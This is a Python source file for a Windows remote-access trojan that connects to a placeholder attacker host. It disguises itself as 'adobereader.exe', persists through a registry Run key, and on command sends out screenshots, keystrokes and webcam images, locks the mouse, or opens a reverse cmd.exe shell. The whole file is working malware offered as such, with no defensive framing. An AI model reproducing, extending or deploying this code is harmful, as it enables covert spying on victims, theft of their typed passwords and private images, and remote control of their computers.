#encoding UTF-8
import pythoncom
import pyHook
import pyautogui
import tempfile
from PIL import ImageGrab
import cv2
import socket,subprocess,os, threading
import time

#################################
# this function was copied from https://github.com/guilhermej/py_trojan/blob/master/py_trojan2.py
global FILENAME, TEMPDIR, DIRETORIO
FILENAME = 'adobereader.exe'
TEMPDIR = tempfile.gettempdir()
DIRETORIO = os.path.dirname(os.path.abspath(__file__))

def autorun():
    try:
        os.system("copy " + FILENAME + " " + TEMPDIR)
    except:
        #print 'Erro na copia'
        pass

    try:
        FNULL = open(os.devnull, 'w')
        subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
                         " /v AdobeReader /d " + TEMPDIR + "\\" + FILENAME, stdout=FNULL, stderr=FNULL)
    except:
        #print 'Erro no registro'
        pass

if DIRETORIO.lower() != TEMPDIR.lower():
    autorun()
    
def init():
    try:
        global lock, lock_loop
        lock_loop = False
        lock = False
        while True:
            pack = sock.recv(1024)
            if pack == 'screenshot':
                screenshot()
                
            elif pack == "keylogger":
                keylogger()
                
            elif pack == "exit":
                sock.close()
                connect()

            elif pack == "shell":
                global port2
                port2 = int(sock.recv(1024))
                shellr()

            elif pack == 'mouse_lock':
                pyautogui.FAILSAFE = False
                lock = True
                lockmouse()

            elif pack == 'mouse_unlock':
                if lock == False:
                    sock.send("[X] the mouse is already unlocked")
                else:
                    sock.send("[!] The mouse as been unlocked")
                    lock = False
                
            elif pack == "webcam":
                webcam()
                
            elif pack == "imahacker":
                recvmsg()
    except:
        sock.close()
        connect()

def recvmsg():
    data = sock.recv(4025)
    file = open('msg.txt' , 'w')
    file.write(data)
    file.close()
    def msg():
        os.system("notepad.exe msg.txt")

    printmsg = threading.Thread(target=msg)
    printmsg.start()

def lockmouse():
    lock_loop = True
    def run():
        while lock == True:
            pyautogui.moveTo(0, 0)

    sock.send("[!] Mouse as been locked\n")
    mouse_run = threading.Thread(target=run)
    mouse_run.start()

def shellr():
    s = socket.socket()
    try:
        time.sleep(2)
        s.connect((ip, int(port2)))
    except Exception as erro:
        None

    def shell_recv(s, p):
        while True:
            data = s.recv(1024)
            if len(data) > 0:
                p.stdin.write(data)
                p.stdin.flush()

    def shell(s, p):
        while True:
            s.sendall(p.stdout.read(1))

    try:
        p=subprocess.Popen(["\\windows\\system32\\cmd.exe", '-i'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
        rshell_thread = threading.Thread(target=shell_recv, args=[s, p])
        rshell_thread.daemon = True
        rshell_thread.start()

        shell_thread = threading.Thread(target=shell, args=[s, p])
        shell_thread.daemon = True
        shell_thread.start()

        p.wait()
    except KeyboardInterrupt:
        s.close()
        sock.close()
        connect()


def screenshot():
    try:
        image = ImageGrab.grab()
        image.save("log.jpg")
        with open('log.jpg', 'rb') as data:
            sock.send(data.read())
            d = data.read()
        data.close()
        os.remove("log.jpg")
    except Exception as Error:
        #print Error
        sock.send('ERROR')
        sock.send("Erro: "+str(Error))
        init()

def keylogger():
    def getkey(event):
        sock.send(str(event.Key))
        return True

    liskey = pyHook.HookManager()
    liskey.KeyDown = getkey
    liskey.HookKeyboard()
    pythoncom.PumpMessages()

def webcam():
    try:
        cam = cv2.VideoCapture(0)
        return_value, image = cam.read()
        cv2.imwrite('pic.jpg', image)
        del(cam)
        with open('pic.jpg', 'rb') as image:
            sock.send(image.read())
            image = image.read()
        data.close()
        os.remove("pic.jpg")
    except Exception as erro:
        sock.send("ERROR")
        sock.send(str(erro)+"\nErro: the computer does not have a webcam or the user does not have the appropriate permissions")
    
def connect():
    global ip
    ip = 'LOCALIP'
    port = LOCALPORT

    global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    import time
    ok = False
    while ok == False:
        try:
            sock.connect((ip, int(port)))
            ok = True
            print 'conectado'
        except Exception as erro:
            print "host off...", erro
            time.sleep(5)

    init()

connect()



